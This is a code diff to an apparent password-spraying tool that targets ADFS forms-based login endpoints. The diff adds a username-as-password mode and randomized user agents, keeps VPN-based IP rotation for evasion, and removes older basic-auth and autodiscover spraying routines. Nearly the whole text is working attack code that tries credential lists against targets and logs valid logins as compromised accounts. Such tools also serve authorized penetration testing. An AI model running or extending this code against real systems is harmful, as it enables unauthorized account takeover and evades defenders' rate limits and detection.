@@ -10,7 +10,7 @@ import urllib
 import urllib.parse
 import requests
 from nordvpn_switcher import initialize_VPN,terminate_VPN
-from utils import configure_logger, random_time, userlist, passwordlist, targetlist, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event, has_user_password_been_tested, has_user_been_pwned
+from utils import configure_logger, make_session, random_time, userlist, passwordlist, targetlist, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event, has_user_password_been_tested, has_user_been_pwned
 from requests.packages.urllib3.exceptions import InsecureRequestWarning, TimeoutError
 from requests_ntlm import HttpNtlmAuth
 
@@ -40,6 +40,7 @@ def args_parse():
     user_group.add_argument('-u', '--user', help="Single email to test")
     pass_group.add_argument('-p', '--password', help="Single password to test")
     pass_group.add_argument('-P', '--passwordlist', help="Password list to test, one password per line")
+    pass_group.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
     target_group.add_argument('-T', '--targetlist', help="Targets list to use, one target per line")
     target_group.add_argument('-t', '--target', help="Target server to authenticate against")
     sleep_group.add_argument('-s', '--sleep', type=int, help="Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0", default=0)
@@ -53,100 +54,19 @@ def args_parse():
     return parser.parse_args()
 
 
-
-def basicauth_attempts(users, passwords, targets, sleep_time, random, min_sleep, max_sleep, verbose):
-    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
-    
-    ip = get_public_ip(timeout=5, retries=2)
-    try:
-        LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-        for target in targets:  # checking each target separately
-            for password in passwords:  # trying one password against each user, less likely to lockout users
-                for username in users:
-                    session = requests.Session()
-                    session.auth = (username, password)
-                    response = session.get(target)
-                    #  Currently checking only if working or not, need to add more tests in the future
-                    if response.status_code == 200:
-                        log_event(subject=username, password=password, target=target, status="success", ip=ip, details="")
-                        working_creds_counter += 1
-                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
-                    else:
-                        log_event(subject=username, password=password, target=target, status="fail", ip=ip, details="")
-                        LOGGER.debug("[-]Creds failed for: %s" % username)
-                    if random is True:  # let's wait between attempts
-                        sleep_time = random_time(min_sleep, max_sleep)
-                        time.sleep(float(sleep_time))
-                    else:
-                        time.sleep(float(sleep_time))
-
-        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
-        LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-
-    except TimeoutError:
-        LOGGER.critical("[!] Timeout! check if target is accessible")
-        pass
-
-    except KeyboardInterrupt:
-        LOGGER.critical("[CTRL+C] Stopping the tool")
-        exit(1)
-
-    except Exception as e:
-        excptn(e)
-
-
-def autodiscover_attempts(users, passwords, targets, sleep_time, random, min_sleep, max_sleep, verbose):
-    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
-
-    ip = get_public_ip(timeout=5, retries=2)
-    try:
-        LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-        for target in targets:  # checking each target separately
-            for password in passwords:  # trying one password against each user, less likely to lockout users
-                for username in users:
-                    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-                    req = requests.get(target, auth=HttpNtlmAuth(username, password),
-                                       headers={'User-Agent': 'Microsoft'}, verify=False)
-                    #  Currently checking only if working or not, need to add more tests in the future
-                    if req.status_code == 200:
-                        log_event(subject=username, password=password, target=target, status="success",  ip=ip, details="")
-                        working_creds_counter += 1
-                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
-                    else:
-                        log_event(subject=username, password=password, target=target, status="fail", ip=ip, details="")
-                        LOGGER.debug("[-]Creds failed for: %s" % username)
-                    if random is True:  # let's wait between attempts
-                        sleep_time = random_time(min_sleep, max_sleep)
-                        time.sleep(float(sleep_time))
-                    else:
-                        time.sleep(float(sleep_time))
-
-        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
-        LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-
-    except TimeoutError:
-        LOGGER.critical("[!] Timeout! check if target is accessible")
-        pass
-
-    except KeyboardInterrupt:
-        LOGGER.critical("[CTRL+C] Stopping the tool")
-        exit(1)
-
-    except Exception as e:
-        excptn(e)
-
-
-def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success):
+def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success, userAsPass):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
     username_counter = 0
     prev_ip = initial_ip
-    total_attempts = len(usernames) * len(passwords) * len(targets)
+    total_attempts = len(usernames) * len(usernames if userAsPass else passwords) * len(targets)
 
     try:
         LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
         for target in targets:  # checking each target separately
-            for password in passwords:  # trying one password against each user, less likely to lockout users
-                for username in usernames:
+            for username in usernames:
+                if (userAsPass):
+                        passwords = [username.split('@')[0]]
+                for password in passwords:  # trying one password against each user, less likely to lockout users
                     if ignore_success:
                         try:
                             already = has_user_been_pwned(username)
@@ -182,24 +102,30 @@ def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
                                  "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
                     post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
                                                         'AuthMethod': 'FormsAuthentication'}).encode('ascii')
-                    session = requests.Session()
+                    session = make_session(random_ua=True)
                     session.auth = (username, password)
-                    response = session.post(target_url, data=post_data, allow_redirects=False,
+                    
+                    try:
+                        response = session.post(target_url, data=post_data, allow_redirects=False,
                                             headers={'Content-Type': 'application/x-www-form-urlencoded',
-                                                     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) '
-                                                                   'Gecko/20100101 Firefox/65.0',
                                                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
                                                                'image/webp,*/*;q=0.8'})
-                    status_code = response.status_code
-                    #  Currently checking only if working or not, need to add more tests in the future
+                        sent_headers = response.request.headers
+                        LOGGER.debug(f"Sent headers: {sent_headers}")
+                        status_code = response.status_code
+                        #  Currently checking only if working or not, need to add more tests in the future
 
-                    if status_code == 302:
-                        log_event(subject=username, password=password, target=target, status="success", ip=ip, details="")
-                        working_creds_counter += 1
-                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
-                    else:
-                        log_event(subject=username, password=password, target=target, status="fail", ip=ip, details="")
-                        LOGGER.debug("[-]Creds failed for: %s" % username)
+                        if status_code == 302:
+                            log_event(subject=username, password=password, target=target, status="success", ip=ip, details="")
+                            working_creds_counter += 1
+                            LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
+                        else:
+                            log_event(subject=username, password=password, target=target, status="fail", ip=ip, details="")
+                            LOGGER.debug("[-]Creds failed for: %s" % username)
+                        session.close()
+                    except requests.exceptions.RequestException as e:
+                        LOGGER.warning(f"Request failed for {username}@{target_url}: {e}")
+                    
                     if random is True:  # let's wait between attempts
                         sleep_time = random_time(min_sleep, max_sleep)
                         time.sleep(float(sleep_time))
@@ -252,6 +178,7 @@ def main():
             passwords = passwordlist(args.passwordlist)
         except Exception as err:
             excptn(err)
+
     if args.target:
         try:
             targets = [args.target]
@@ -268,7 +195,7 @@ def main():
         max_sleep = args.random[1]
 
     total_accounts = len(usernames)
-    total_passwords = len(passwords)
+    total_passwords = len(usernames if args.userAsPass else passwords)
     total_targets = len(targets)
     total_attempts = total_accounts * total_passwords * total_targets
     LOGGER.info("Total number of users to test: %s" % str(total_accounts))
@@ -301,20 +228,10 @@ def main():
             LOGGER.info(f"[VPN] Initial public IP: {initial_ip}")
 
 
-    if args.method == 'autodiscover':
-        LOGGER.info("[*] You chose %s method" % args.method)
-        autodiscover_attempts(usernames, passwords, targets,
-                              args.sleep, random, min_sleep, max_sleep, args.verbose)
-
-    elif args.method == 'adfs':
+    if args.method == 'adfs':
         LOGGER.info("[*] You chose %s method" % args.method)
         adfs_attempts(usernames, passwords, targets,
-                      args.sleep, random, min_sleep, max_sleep, args.vpn, area, initial_ip, args.skip_tested, args.ignore_success)
-
-    elif args.method == 'basicauth':
-        LOGGER.info("[*] You chose %s method" % args.method)
-        basicauth_attempts(usernames, passwords, targets,
-                           args.sleep, random, min_sleep, max_sleep, args.verbose)
+                      args.sleep, random, min_sleep, max_sleep, args.vpn, area, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass)
 
     else:
         LOGGER.critical("[!] Please choose a method (autodiscover or adfs)")
